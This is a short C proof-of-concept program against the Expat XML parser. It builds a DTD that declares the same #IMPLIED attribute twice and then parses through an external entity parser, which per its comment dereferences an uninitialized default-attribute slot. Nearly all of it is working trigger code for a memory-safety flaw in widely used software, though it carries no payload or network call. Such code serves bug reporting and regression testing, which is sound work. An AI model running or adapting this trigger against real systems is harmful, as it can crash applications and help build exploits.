/* PoC: An external entity parser inherits the DTD of its parent parser.
 * When an element declares the same #IMPLIED attribute more than once,
 * the DTD holds one default-attribute slot per declaration while only the
 * first declaration is binding.  Parsing an element of that type through
 * XML_ExternalEntityParserCreate then walks a default-attribute slot that
 * was never initialized and dereferences it.
 */
#include <stdio.h>
#include <string.h>
#include "expat.h"

static int XMLCALL
external_entity_handler(XML_Parser parser, const XML_Char *context,
                        const XML_Char *base, const XML_Char *systemId,
                        const XML_Char *publicId) {
  XML_Parser ext_parser;
  const char *const text = "<e/>";
  enum XML_Status status;

  (void)base;
  (void)systemId;
  (void)publicId;

  ext_parser = XML_ExternalEntityParserCreate(parser, context, NULL);
  if (ext_parser == NULL)
    return XML_STATUS_ERROR;
  status = XML_Parse(ext_parser, text, (int)strlen(text), XML_TRUE);
  XML_ParserFree(ext_parser);
  return status;
}

int
main(void) {
  const char *const doc
      = "<!DOCTYPE d [\n"
        "  <!ELEMENT d ANY>\n"
        "  <!ATTLIST e a CDATA #IMPLIED>\n"
        "  <!ATTLIST e a CDATA #IMPLIED>\n"
        "  <!ENTITY ext SYSTEM 'ext.ent'>\n"
        "]>\n"
        "<d>&ext;</d>";
  XML_Parser parser = XML_ParserCreate(NULL);
  enum XML_Status status;

  if (parser == NULL) {
    fprintf(stderr, "parser creation failed\n");
    return 1;
  }
  XML_SetExternalEntityRefHandler(parser, external_entity_handler);
  status = XML_Parse(parser, doc, (int)strlen(doc), XML_TRUE);
  printf("parse status=%d error=%s\n", (int)status,
         XML_ErrorString(XML_GetErrorCode(parser)));
  XML_ParserFree(parser);
  return 0;
}
